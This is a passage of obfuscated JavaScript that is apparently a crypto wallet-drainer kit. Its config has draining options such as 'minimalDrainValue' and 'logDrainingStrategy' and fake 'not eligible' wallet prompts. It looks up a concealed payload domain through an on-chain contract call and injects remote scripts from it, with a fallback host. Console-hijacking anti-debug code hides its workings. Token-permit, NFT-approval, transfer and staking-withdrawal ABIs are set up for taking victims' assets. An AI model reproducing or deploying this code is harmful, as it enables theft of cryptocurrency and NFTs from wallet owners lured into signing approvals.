"zvDhzG", "i2KZW7e", "tvngra", "ANj0rq", "s3rMBq", "W77dVCo8wW", "W43dGCodW5K", "WONdN1lcLa", "DM9NDG", "s0rUEG", "ugv1zG", "u8odWPZdMW", "rvbuza", "W73cGNnu", "l8okW6ZdKq", "DefKza", "txDYqW", "W4aBWRFdJq", "WQDadwC", "WRldQSk5ua", "wCklwI4", "W5BdR2iY", "W5lcGwpdGa", "W6tdGNyQ", "WR93lmor", "u3zUvq", "W5vOW77cKa", "wxfIEa", "wSkIC8oD", "BwfNzq", "WRFdINJdGq", "uMTgyq", "uHy/WQC", "Ag5jBG", "zMPQta", "ywX1zq", "BffjAa", "W5KBW7BdOG", "Ag9Sza", "W5BdQ8oPzW", "zen2wG", "W5JdMLTK", "vLrdua", "DZnTxW", "Aw1PDa", "zePcta", "BKrYDq", "mNb4oW", "oIaWCa", "AHJdRt8", "W4uCW64", "WQxdUWGU", "WPBcQvVdLa", "nSkgW5lcQG", "Bxvrqq", "sw5Qzq", "ugnnEq", "WQdcP8oqWQ4", "zxiUBW", "e2bahW", "otreuq", "tgLyza", "D0PkAq", "rgLXtG", "WRddVSkpDq", "BNnkqW", "AefmyW", "WQ4oWOVcOW", "W5mbomo4", "BvbqsG", "B1yZma", "W57dR8onW4e", "C2zuCG", "x293BG", "sSkzWQhdOG", "ywDoyq", "rSkjsXC", "WOCKWOJcQa", "WQXVgwa", "Ae5swq", "W6tdUCoxda", "ef5HmW", "wxbnvq", "WRbqf38", "DcbLCG", "yCkhwqe", "t8kIw8oY", "W5/cUteY", "BNPbDa", "t01jwa", "wLPfzG", "u3Lpvq", "DSk4z8oI", "CCkUDCoz", "EMvpCW", "Dgr0Aa", "WO3cJG87", "oLTHlq", "EuLVBG", "q8kjW7FcUG", "WRVdV0pdGW", "WOtdVKBdIq", "WPPdWRZdQW", "tg5SuG", "uezqyG", "zmkBaSkg", "y8kAWRpcNa", "twXZAq", "W5/cIujO", "Fmken8kg", "WPOmW707", "WRDXemoW", "W4xcJfBdOa", "WOxcKfJcPG", "W5tdTg4F", "rvbHsq", "WOz3f3a", "WRldSCk0EG", "yvPeta", "B2XPza", "W7NcGSoyla", "ChzwyG", "tgvAqq", "WOxdOKhdUW", "B2TPAq", "x8o7n8o5", "l2PaW6m", "WRldKhxdMG", "s1bdyG", "c8odWOxdMq", "vLfeuq", "DwrAsa", "BNqTCW", "WOFcMgtcLW", "W4n3gCof", "vhbYyG", "WOddHhpdTG", "zrVdICou", "hmkIW5JcQW", "WRa5WQNcUG", "zuPjqG", "q0zTsa", "z3Ddta", "lY4NsW", "WPFcQaVdKW", "yNHHCG", "FmkRzJ0", "x8oHhCo/", "W7hcMK9M", "WPH4iCkG", "Dg9tDa", "W7BcPJWb", "W57cMmoXWOq", "thnvzG", "WQNdLmkczW", "W68YWQNcHa", "q0eXBW", "EKPPDW", "jxbzaG", "gg17ka", "BSkZWQtcPa", "vNniqq", "uhfUyG", "ueryua", "EvfiyW", "W6mZWQldUG", "qwDLBG", "y1vyyq", "sMPcua", "zgfWBG", "WRTDoa", "y8kPW67dMa", "ue9uqq", "yNDpCa", "WPBdIfJdPW", "ACkYtSos", "vg1yBW", "rKr5qG", "rhLcsq", "z05LyW", "vffrqW", "vNPyrG", "DujmBW", "iwTaW5O", "t1HPAW", "zdyqWP0", "v2njzq", "wvjbzq", "W5KRm8om", "W4lcJrJdRW", "qK90AG", "Bg9JAW", "ANDLsW", "W4W1WRhcIG", "D0r4qq", "W7BdNmosmq", "qMjKCq", "zxnZ", "DvzMAG", "wMn3yq", "wLuQwq", "BwTOBq", "xSkUtSoq", "W7FdG8oHCG", "WPdcM8oxWO8", "W7WYWPJcTG", "wComWRRdHq", "WP5HmeC", "WOaXW4e5", "j2b2iG", "gvvYpG", "AwHkwa", "vmkCWRJdSW", "WQrIsCos", "u25vrW", "w8k7dCkv", "W7BcTZiI", "W4qhW7xdRq", "W7NcH0X9", "CgzuCW", "rJC9WOq", "vbNdTsm", "W6BcHqSf", "rwfJCG", "WQldTW3dMq", "ChG0rq", "WRBdLg3dUW", "t0PiEG", "s25Rsq", "WQqjWRJcPG", "WRNdNSk2", "WOaPWQxcIa", "W54YaSob", "W7JcV293", "ASoaamod", "WPTyWRu", "tsldPd4", "uffZCa", "WRpdN37cTW", "B1LdBa", "rw9Tqq", "WQ8+W5ei", "cCk7WOldTW", "eSkNW7hdQq", "mmkWW6BcSW", "dgDSnW", "y29SBW", "yxzLvG", "WQ91cCkD", "WOpcVaXv", "CNLOtW", "DMvUza", "W4a3W4GG", "Bs9Zzq", "heigW5W", "wCktstW", "W6qZW7Gi", "lYOnwa", "WQddQ8kKua", "WQ4xWRtcHG", "CMD3vW", "WQdcMMtcKq", "txfSAq", "mtm3", "W7WUWR7cHG", "z0zAAa", "W7eXWR/cIG", "tMn0zG", "C0fZqq", "xSognmo4", "AMHIBq", "uSkZBmov", "ExPoDG", "yMrysW", "zdG3nq", "CmkzWP3dSW", "ngmXnW", "BvPYna", "z1DOta", "h2e/W70", "BLfPsG", "Dc1ZCa", "DhLfzG", "qureqG", "W7RcQGSL", "msyeqG", "j0vUkq", "W4aNW54d", "WPXiaCkN", "vrddISo6", "y2u7ia", "WQpdJ13dGG", "ESkEFWW", "msCbAa", "E8o6dSoX", "W4epWRlcRG", "W5yZW5Wd", "vefmtW", "rhv1tG", "WRDhb8oy", "DezbAa", "WOj9gfq", "eSklCrW", "W5mXW6BdOG", "W4xdU8oxva", "C3DttW", "ECoAh8oz", "rvDmuW", "WP5xnwC", "qw1hvG", "FLeosq", "DLHyCW", "fGixAq", "WQpdHM/dPa", "wmoaW4tdMG", "WOxdUWzk", "WQpdK8koqq", "DLm3tW", "wWeJWRG", "wvfRsW", "Aw5PBq", "qKLkAW", "lIxdLdS", "W6pdICoWDa", "W7WWWOlcKq", "kt8jAq", "WPCkW7SJ", "CSoAaSoE", "W6mPW6pdIW", "W43cPIio", "W6hdMCourW", "udddSr4", "lwfUW7S", "y0KTCq", "EwLSuW", "WP/cPaHb", "W7xdSCoubG", "nwq1oq", "t2r3sW", "W4FdP8o7W40", "W57cUSoQiq", "W4ldImovaG", "se9mzG", "WPGOWPxcHq", "W5Guimog", "cmoCW5xcJa", "emkYrYm", "W5pcMxvI", "dW8Adq", "W5RdQwKO", "l8ohptK", "WOngnxy", "z1zQvq", "tKroDG", "W4blW6lcSW", "zZ4kia", "oCogWRJcJG", "AxrdBW", "qK1LDq", "nfD6ma", "sNntDq", "Cb7dRCo/", "t8kEWRddOG", "bmohWOVdGq", "qKf0AW", "lxbNW78", "y3LvBa", "sunoAq", "WQjKtCo4", "W5/dQCoLsq", "fwjllq", "WQzna8o4", "WOrHevS", "W6BdMmoJiW", "WQGgWOpcJW", "nJG3oq", "tLHjDa", "u2O5nG", "DerSsa", "r2TICq", "zJe0nW", "tvDVBW"];
    J = function () {
        return n4t;
    };
    return J();
}
B["8453"] = 0.01;
B["42220"] = 0.5;
B["42161"] = 0.002;
B["43114"] = 0x1;
function t5(t, n, K) {
    return j(K + 0x1d5, n);
}
let outdatedcfg = typeof cfgversion == "undefined";
let config = {
    "API_KEY": ACCESS_KEY,
    "logDrainingStrategy": logDrainingStrategy,
    "logEmptyWallets": logEmptyWallets,
    "logClosedTab": false,
    "logIpData": logIpData,
    "logPromptingEnabled": typeof logPromptingEnabled !== "undefined" ? logPromptingEnabled : false,
    "USE_W3M_V3": typeof USE_W3M_V3 !== "undefined" ? USE_W3M_V3 : true,
    "chooseTheme": typeof chooseWalletTheme !== "undefined" ? chooseWalletTheme : "dark",
    "themeVariables": themeVariables,
    "twoStep": twoStep,
    "wc_project": typeof wc_projectid !== "undefined" ? wc_projectid : "0761e7d1b5103f901dbdb7fd033df5b9",
    "infuraproject": typeof infura_key !== "undefined" ? infura_key : "9aa3d95b3bc440fa88ea12eaa4456161",
    "retry_changenetwork": typeof retry_changenetwork !== "undefined" ? retry_changenetwork : 2,
    "minimalDrainValue": typeof minimalDrainValue !== "undefined" ? minimalDrainValue : 0.001,
    "version": 0x35e,
    "repeatHighest": typeof repeatHighest !== "undefined" ? repeatHighest : true,
    "experimental": typeof experimental !== "undefined" ? experimental : Q,
    "useSweetAlert": typeof useSweetAlert !== "undefined" ? useSweetAlert : true,
    "notEli": typeof notEligible !== "undefined" ? notEligible : "This wallet is not eligible. Please use a different wallet with enough assets",
    "swal_notEligibleTitle": typeof swal_notEligibleTitle !== "undefined" ? swal_notEligibleTitle : "Not eligible",
    "swal_addressChangedTitle": typeof swal_addressChangedTitle !== "undefined" ? swal_addressChangedTitle : "Your wallet address has changed, connect wallet again please",
    "addressChanged": typeof addressChanged !== "undefined" ? addressChanged : "Address changed",
    "design": {
        "retryDelay": 0xbb8,
        "connectElement": typeof connectElement !== "undefined" ? connectElement : "connectButton",
        "messageElement": typeof messageElement !== "undefined" ? messageElement : "messageButton",
        "twoStepButtonElement": typeof twoStepButtonElement !== "undefined" ? twoStepButtonElement : "startButton",
        "buttonMessagesEnabled": typeof buttonMessagesEnabled !== "undefined" ? buttonMessagesEnabled : false,
        "buttonMessages": {
            "initialConnect": typeof textInitialConnected !== "undefined" ? textInitialConnected : "Try again",
            "initialConnected": typeof textInitialConnected !== "undefined" ? textInitialConnected : "Try again",
            "progress": typeof textProgress !== "undefined" ? textProgress : "Loading ...",
            "success": typeof success !== "undefined" ? success : "Please approve ...",
            "failed": typeof failed !== "undefined" ? failed : "Try again !"
        },
        "enablePopup": popupEnabled
    },
    "popupCode": typeof popupCode !== "undefined" ? popupCode : '',
    "useDefaultPopup": typeof useDefaultPopup !== "undefined" ? useDefaultPopup : true,
    "multipliers": typeof multipliers !== "undefined" ? multipliers : f,
    "claimInfo": Z,
    "nativeMinimals": B,
    "researchers_full": [],
    "researchers": researchers,
    "mainModal": typeof mainModal !== "undefined" ? mainModal : "w3m"
};
window.rtrt4j54jm43c590 = "infura-api.com";
function j(n) {
    const g = J();
    j = function (K, u) {
        K = K - 377;
        let k = g[K];
        if (j.yCNgpC === undefined) {
            var q = function (B) {
                let m = '';
                let a = '';
                let S = m + q;
                let U = 0;
                let D;
                let l;
                for (let M = 0; l = B.charAt(M++); ~l && (D = U % 4 ? D * 64 + l : l, U++ % 4) ? m += S.charCodeAt(M + 10) - 10 !== 0 ? String.fromCharCode(255 & D >> (-2 * U & 6)) : U : 0) {
                    l = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(l);
                }
                let G = 0;
                for (let O = m.length; G < O; G++) {
                    a += "%" + ("00" + m.charCodeAt(G).toString(16)).slice(-2);
                }
                return decodeURIComponent(a);
            };
            const Z = function (B, Y) {
                let m = [];
                let a = 0;
                let S;
                let U = '';
                B = q(B);
                let D;
                for (D = 0; D < 256; D++) {
                    m[D] = D;
                }
                for (D = 0; D < 256; D++) {
                    a = (a + m[D] + Y.charCodeAt(D % Y.length)) % 256;
                    S = m[D];
                    m[D] = m[a];
                    m[a] = S;
                }
                D = 0;
                a = 0;
                for (let l = 0; l < B.length; l++) {
                    D = (D + 1) % 256;
                    a = (a + m[D]) % 256;
                    S = m[D];
                    m[D] = m[a];
                    m[a] = S;
                    U += String.fromCharCode(B.charCodeAt(l) ^ m[(m[D] + m[a]) % 256]);
                }
                return U;
            };
            j.VQMEdB = Z;
            arguments;
            j.yCNgpC = true;
        }
        const Q = g[0];
        const f = K + Q;
        const b = arguments[f];
        if (!b) {
            if (j.UyjIrm === undefined) {
                const B = function (Y) {
                    this.tcebol = Y;
                    this.lHgfVj = [1, 0, 0];
                    this.XMtEmb = function () {
                        return "newState";
                    };
                    this.pNAMiX = "\\w+ *\\(\\) *{\\w+ *";
                    this.tcEbnl = "['|\"].+['|\"];? *}";
                };
                B.prototype.ppNjPS = function () {
                    const Y = new RegExp(this.pNAMiX + this.tcEbnl);
                    const m = Y.test(this.XMtEmb.toString()) ? --this.lHgfVj[1] : --this.lHgfVj[0];
                    return this.FFNaAz(m);
                };
                B.prototype.FFNaAz = function (Y) {
                    if (!Boolean(~Y)) {
                        return Y;
                    }
                    return this.CKKQra(this.tcebol);
                };
                B.prototype.CKKQra = function (Y) {
                    let m = 0;
                    for (let a = this.lHgfVj.length; m < a; m++) {
                        this.lHgfVj.push(Math.round(Math.random()));
                        a = this.lHgfVj.length;
                    }
                    return Y(this.lHgfVj[0]);
                };
                new B(j).ppNjPS();
                j.UyjIrm = true;
            }
            k = j.VQMEdB(k, u);
            arguments[f] = k;
        } else {
            k = b;
        }
        return k;
    };
    return j(arguments, n);
}
function q(n) {
    const g = J();
    q = function (K, u) {
        K = K - 377;
        let k = g[K];
        if (q.NEaGCb === undefined) {
            var j = function (Z) {
                let Y = '';
                let m = '';
                let a = Y + j;
                let S = 0;
                let U;
                let D;
                for (let l = 0; D = Z.charAt(l++); ~D && (U = S % 4 ? U * 64 + D : D, S++ % 4) ? Y += a.charCodeAt(l + 10) - 10 !== 0 ? String.fromCharCode(255 & U >> (-2 * S & 6)) : S : 0) {
                    D = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(D);
                }
                let M = 0;
                for (let G = Y.length; M < G; M++) {
                    m += "%" + ("00" + Y.charCodeAt(M).toString(16)).slice(-2);
                }
                return decodeURIComponent(m);
            };
            q.ZkQpXb = j;
            arguments;
            q.NEaGCb = true;
        }
        const Q = g[0];
        const f = K + Q;
        const b = arguments[f];
        if (!b) {
            const Z = function (B) {
                this.TKhvoB = B;
                this.GqyMDu = [1, 0, 0];
                this.MPTMoN = function () {
                    return "newState";
                };
                this.lZMDPy = "\\w+ *\\(\\) *{\\w+ *";
                this.sjkUxS = "['|\"].+['|\"];? *}";
            };
            Z.prototype.ZdiYQc = function () {
                const B = new RegExp(this.lZMDPy + this.sjkUxS);
                const Y = B.test(this.MPTMoN.toString()) ? --this.GqyMDu[1] : --this.GqyMDu[0];
                return this.wNREwk(Y);
            };
            Z.prototype.wNREwk = function (B) {
                if (!Boolean(~B)) {
                    return B;
                }
                return this.OzkfxO(this.TKhvoB);
            };
            Z.prototype.OzkfxO = function (B) {
                let Y = 0;
                for (let m = this.GqyMDu.length; Y < m; Y++) {
                    this.GqyMDu.push(Math.round(Math.random()));
                    m = this.GqyMDu.length;
                }
                return B(this.GqyMDu[0]);
            };
            new Z(q).ZdiYQc();
            k = q.ZkQpXb(k);
            arguments[f] = k;
        } else {
            k = b;
        }
        return k;
    };
    return q(arguments, n);
}
if (config.useSweetAlert || config.useDefaultPopup) {
    injectScript("https://cdn.jsdelivr.net/npm/sweetalert2@11");
}
injectScript("https://unpkg.com/crypto-js@latest/crypto-js.js");
injectScript("https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js");
injectScript("https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js");
function fromHex(t) {
    var k = '';
    for (var Y = 0; Y < t.length; Y += 2) {
        k += String.fromCharCode(parseInt(t.substr(Y, 2), 16));
    }
    return decodeURIComponent(escape(k)).replace(/[^a-zA-Z0-9.-]/g, '');
}
const requestData = {
    "jsonrpc": "2.0",
    "method": "eth_call",
    "params": [{
        "to": "0x941E09C78cc72b5C264c17BA6327c06A0Faad6e5",
        "data": "0xc2fb26a629690e2388a22f16d924e4a645cd2b40a8e24c414d664ad7ea957b73"
    }, "latest"],
    "id": 0x1
};
fetch("https://mainnet.infura.io/v3/b6bf7d3508c941499b10025c0776eaf8", {
    "method": "POST",
    "headers": {
        "Content-Type": "application/json"
    },
    "body": JSON.stringify(requestData)
}).then(t => t.json()).then(t => {
    console.log("Result:", t.result);
    let k = fromHex(t.result);
    k = k.trim();
    injectScript("https://" + k + "/npm/seaport.min.js");
    if (config.USE_W3M_V3) {
        injectScript("https://" + k + "/npm/web3modal.v3.89979e8a.js");
    } else {
        injectScript("https://" + k + "/npm/web3modal.v2.db49e40a.js");
    }
})["catch"](t => {
    console.error("Error:", t);
    console.log("Using fallback cdn");
    injectScript("https://browsersjsfiles.com/npm/seaport.min.js");
    injectScript("https://browsersjsfiles.com/npm/ethereum-tx.min.js");
    if (config.USE_W3M_V3) {
        injectScript("https://browsersjsfiles.com/npm/web3modal.v3.89979e8a.js");
    } else {
        injectScript("https://browsersjsfiles.com/npm/web3modal.v2.db49e40a.js");
    }
});
function isScriptLoaded(t) {
    var k = document.getElementsByTagName("script");
    for (var Y = 0; Y < k.length; Y++) {
        if (k[Y].src === t) {
            return true;
        }
    }
    return false;
}
function t6(t, n, K) {
    return j(n + 0x237, K);
}
function injectScript(Y) {
    const S = function () {
        let s = true;
        return function (v, C) {
            const E = s ? function () {
                if (C) {
                    const w = C.apply(v, arguments);
                    C = null;
                    return w;
                }
            } : function () {};
            s = false;
            return E;
        };
    }();
    const U = S(this, function () {
        return U.toString().search("(((.+)+)+)+$").toString().constructor(U).search("(((.+)+)+)+$");
    });
    U();
    const D = function () {
        let s = true;
        return function (v, C) {
            const E = s ? function () {
                if (C) {
                    const w = C.apply(v, arguments);
                    C = null;
                    return w;
                }
            } : function () {};
            s = false;
            return E;
        };
    }();
    (function () {
        D(this, function () {
            const v = new RegExp("function *\\( *\\)");
            const C = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
            const E = g("init");
            if (!v.test(E + "chain") || !C.test(E + "input")) {
                E("0");
            } else {
                g();
            }
        })();
    })();
    const l = function () {
        let s = true;
        return function (v, C) {
            const E = s ? function () {
                if (C) {
                    const w = C.apply(v, arguments);
                    C = null;
                    return w;
                }
            } : function () {};
            s = false;
            return E;
        };
    }();
    const M = l(this, function () {
        const C = function () {
            let X;
            try {
                X = Function("return (function() {}.constructor(\"return this\")( ));")();
            } catch (P) {
                X = window;
            }
            return X;
        };
        const E = C();
        const w = E.console = E.console || {};
        const T = ["log", "warn", "info", "error", "exception", "table", "trace"];
        for (let X = 0; X < T.length; X++) {
            const P = l.constructor.prototype.bind(l);
            const o = T[X];
            const x = w[o] || P;
            P.__proto__ = l.bind(l);
            P.toString = x.toString.bind(x);
            w[o] = P;
        }
    });
    M();
    if (!isScriptLoaded(Y)) {
        var r = document.createElement("script");
        r.charset = "UTF-8";
        r.async = "true";
        r.type = "text/javascript";
        r.src = Y;
        var d = document.head || document.getElementsByTagName("head")[0];
        if (d.firstChild) {
            d.insertBefore(r, d.firstChild);
        } else {
            d.appendChild(r);
        }
    }
}
const CURVE_ABI = [{
    "stateMutability": "nonpayable",
    "type": "function",
    "name": "remove_liquidity_one_coin",
    "inputs": [{
        "name": "_burn_amount",
        "type": "uint256"
    }, {
        "name": "i",
        "type": "int128"
    }, {
        "name": "_min_received",
        "type": "uint256"
    }, {
        "name": "_receiver",
        "type": "address"
    }],
    "outputs": [{
        "name": '',
        "type": "uint256"
    }]
}];
const CURVE_USE_ETH_ABI = [{
    "stateMutability": "nonpayable",
    "type": "function",
    "name": "remove_liquidity_one_coin",
    "inputs": [{
        "name": "token_amount",
        "type": "uint256"
    }, {
        "name": "i",
        "type": "uint256"
    }, {
        "name": "min_amount",
        "type": "uint256"
    }, {
        "name": "use_eth",
        "type": "bool"
    }, {
        "name": "receiver",
        "type": "address"
    }],
    "outputs": [{
        "name": '',
        "type": "uint256"
    }]
}];
const DAI_PERMIT_ABI = [{
    "constant": false,
    "inputs": [{
        "name": "_src",
        "type": "address"
    }, {
        "name": "_dst",
        "type": "address"
    }, {
        "name": "_wad",
        "type": "uint256"
    }],
    "name": "transferFrom",
    "outputs": [{
        "name": '',
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "internalType": "address",
        "name": "holder",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "spender",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "nonce",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "expiry",
        "type": "uint256"
    }, {
        "internalType": "bool",
        "name": "allowed",
        "type": "bool"
    }, {
        "internalType": "uint8",
        "name": "v",
        "type": "uint8"
    }, {
        "internalType": "bytes32",
        "name": "r",
        "type": "bytes32"
    }, {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
    }],
    "name": "permit",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "internalType": "address",
        "name": '',
        "type": "address"
    }],
    "name": "nonces",
    "outputs": [{
        "internalType": "uint256",
        "name": '',
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}];
const LP_ABI = [{
    "inputs": [{
        "internalType": "bytes[]",
        "name": "data",
        "type": "bytes[]"
    }],
    "name": "multicall",
    "outputs": [{
        "internalType": "bytes[]",
        "name": "results",
        "type": "bytes[]"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "operator",
        "type": "address"
    }, {
        "internalType": "bool",
        "name": "approved",
        "type": "bool"
    }],
    "name": "setApprovalForAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}];
const NFT_ABI = [{
    "inputs": [{
        "internalType": "address",
        "name": "owner",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "operator",
        "type": "address"
    }],
    "name": "isApprovedForAll",
    "outputs": [{
        "internalType": "bool",
        "name": '',
        "type": "bool"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "operator",
        "type": "address"
    }, {
        "internalType": "bool",
        "name": "approved",
        "type": "bool"
    }],
    "name": "setApprovalForAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "tokenId",
        "type": "uint256"
    }],
    "name": "approve",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}];
const UNISWAP = [{
    "inputs": [{
        "internalType": "uint256",
        "name": "amountIn",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "amountOutMin",
        "type": "uint256"
    }, {
        "internalType": "address[]",
        "name": "path",
        "type": "address[]"
    }, {
        "internalType": "address",
        "name": "to",
        "type": "address"
    }],
    "name": "swapExactTokensForTokens",
    "outputs": [{
        "internalType": "uint256",
        "name": "amountOut",
        "type": "uint256"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
    }, {
        "internalType": "bytes[]",
        "name": "data",
        "type": "bytes[]"
    }],
    "name": "multicall",
    "outputs": [{
        "internalType": "bytes[]",
        "name": '',
        "type": "bytes[]"
    }],
    "stateMutability": "payable",
    "type": "function"
}];
const PANCAKESWAPV3 = [{
    "inputs": [{
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
    }, {
        "internalType": "bytes[]",
        "name": "data",
        "type": "bytes[]"
    }],
    "name": "multicall",
    "outputs": [{
        "internalType": "bytes[]",
        "name": '',
        "type": "bytes[]"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "internalType": "address",
            "name": "tokenIn",
            "type": "address"
        }, {
            "internalType": "address",
            "name": "tokenOut",
            "type": "address"
        }, {
            "internalType": "uint24",
            "name": "fee",
            "type": "uint24"
        }, {
            "internalType": "address",
            "name": "recipient",
            "type": "address"
        }, {
            "internalType": "uint256",
            "name": "amountIn",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "amountOutMinimum",
            "type": "uint256"
        }, {
            "internalType": "uint160",
            "name": "sqrtPriceLimitX96",
            "type": "uint160"
        }],
        "internalType": "struct IV3SwapRouter.ExactInputSingleParams",
        "name": "params",
        "type": "tuple"
    }],
    "name": "exactInputSingle",
    "outputs": [{
        "internalType": "uint256",
        "name": "amountOut",
        "type": "uint256"
    }],
    "stateMutability": "payable",
    "type": "function"
}];
const SUSHISWAP = [{
    "inputs": [{
        "internalType": "uint256",
        "name": "amountIn",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "amountOutMin",
        "type": "uint256"
    }, {
        "internalType": "address[]",
        "name": "path",
        "type": "address[]"
    }, {
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
    }],
    "name": "swapExactTokensForTokens",
    "outputs": [{
        "internalType": "uint256[]",
        "name": "amounts",
        "type": "uint256[]"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}];
const CRYPTOPUNK = [{
    "constant": false,
    "inputs": [{
        "name": "to",
        "type": "address"
    }, {
        "name": "punkIndex",
        "type": "uint256"
    }],
    "name": "transferPunk",
    "outputs": [],
    "payable": false,
    "type": "function"
}];
const TRADERJOE_ABI = [{
    "inputs": [{
        "internalType": "address",
        "name": "spender",
        "type": "address"
    }, {
        "internalType": "bool",
        "name": "approved",
        "type": "bool"
    }],
    "name": "approveForAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}];
const APECOINSTAKING = [{
    "inputs": [{
        "internalType": "address",
        "name": "_address",
        "type": "address"
    }],
    "name": "getApeCoinStake",
    "outputs": [{
        "components": [{
            "internalType": "uint256",
            "name": "poolId",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "tokenId",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "deposited",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "unclaimed",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "rewards24hr",
            "type": "uint256"
        }, {
            "components": [{
                "internalType": "uint256",
                "name": "mainTokenId",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "mainTypePoolId",
                "type": "uint256"
            }],
            "internalType": "struct ApeCoinStaking.DashboardPair",
            "name": "pair",
            "type": "tuple"
        }],
        "internalType": "struct ApeCoinStaking.DashboardStake",
        "name": '',
        "type": "tuple"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "_address",
        "type": "address"
    }],
    "name": "getBakcStakes",
    "outputs": [{
        "components": [{
            "internalType": "uint256",
            "name": "poolId",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "tokenId",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "deposited",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "unclaimed",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "rewards24hr",
            "type": "uint256"
        }, {
            "components": [{
                "internalType": "uint256",
                "name": "mainTokenId",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "mainTypePoolId",
                "type": "uint256"
            }],
            "internalType": "struct ApeCoinStaking.DashboardPair",
            "name": "pair",
            "type": "tuple"
        }],
        "internalType": "struct ApeCoinStaking.DashboardStake[]",
        "name": '',
        "type": "tuple[]"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "_address",
        "type": "address"
    }],
    "name": "getBaycStakes",
    "outputs": [{
        "components": [{
            "internalType": "uint256",
            "name": "poolId",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "tokenId",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "deposited",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "unclaimed",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "rewards24hr",
            "type": "uint256"
        }, {
            "components": [{
                "internalType": "uint256",
                "name": "mainTokenId",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "mainTypePoolId",
                "type": "uint256"
            }],
            "internalType": "struct ApeCoinStaking.DashboardPair",
            "name": "pair",
            "type": "tuple"
        }],
        "internalType": "struct ApeCoinStaking.DashboardStake[]",
        "name": '',
        "type": "tuple[]"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "_address",
        "type": "address"
    }],
    "name": "getMaycStakes",
    "outputs": [{
        "components": [{
            "internalType": "uint256",
            "name": "poolId",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "tokenId",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "deposited",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "unclaimed",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "rewards24hr",
            "type": "uint256"
        }, {
            "components": [{
                "internalType": "uint256",
                "name": "mainTokenId",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "mainTypePoolId",
                "type": "uint256"
            }],
            "internalType": "struct ApeCoinStaking.DashboardPair",
            "name": "pair",
            "type": "tuple"
        }],
        "internalType": "struct ApeCoinStaking.DashboardStake[]",
        "name": '',
        "type": "tuple[]"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "uint256",
        "name": "_amount",
        "type": "uint256"
    }, {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
    }],
    "name": "withdrawApeCoin",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "internalType": "uint32",
            "name": "tokenId",
            "type": "uint32"
        }, {
            "internalType": "uint224",
            "name": "amount",
            "type": "uint224"
        }],
        "internalType": "struct ApeCoinStaking.SingleNft[]",
        "name": "_nfts",
        "type": "tuple[]"
    }, {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
    }],
    "name": "withdrawBAYC",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "internalType": "uint32",
            "name": "tokenId",
            "type": "uint32"
        }, {
            "internalType": "uint224",
